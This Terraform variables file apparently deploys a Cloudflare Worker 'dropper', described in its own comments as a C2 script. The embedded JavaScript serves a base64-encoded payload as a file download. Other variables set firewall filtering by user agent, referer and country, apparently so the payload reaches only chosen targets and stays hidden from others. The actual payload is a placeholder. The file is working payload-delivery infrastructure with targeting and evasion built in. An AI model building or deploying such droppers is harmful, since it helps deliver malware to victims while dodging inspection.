
variable "uri_pattern" {

}

variable "filter_selection" {
}

variable "worker_name" {
    default = "cf-http-dropper"//won't need to change unless more than one dropper
}

variable "zone_id" {
}

variable "my_domain_name" {

}

variable "file_content" {
}
variable "filename" {
}

//our default C2 script - just pass request on to target domain
variable "worker_script_content" {
    default = <<-EOF
payload = "BASE64FILECONTENT"
function base64Encode (buf) {
let string = '';
(new Uint8Array(buf)).forEach(
(byte) => { string += String.fromCharCode(byte) }
)
return btoa(string)
}
function base64Decode (string) {
string = atob(string);
const
length = string.length,
buf = new ArrayBuffer(length),
bufView = new Uint8Array(buf);
for (var i = 0; i < length; i++) { bufView[i] = string.charCodeAt(i) }
return buf
}
async function handleRequest(request) {
let response = new Response(base64Decode(payload), {
headers: { 'Content-Disposition': 'attachment; filename="FILENAME"' }
})
return response}addEventListener('fetch', event => {  event.respondWith(handleRequest(event.request))})
EOF
}

variable "user_agent" {
    default = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

variable "visit_action" {
    default = "block"
}
variable "description" {
    default = "Dropper-Filter"
}

variable "referer" {
    default = "NONE"
}

variable "country" {
    default = "US"
}

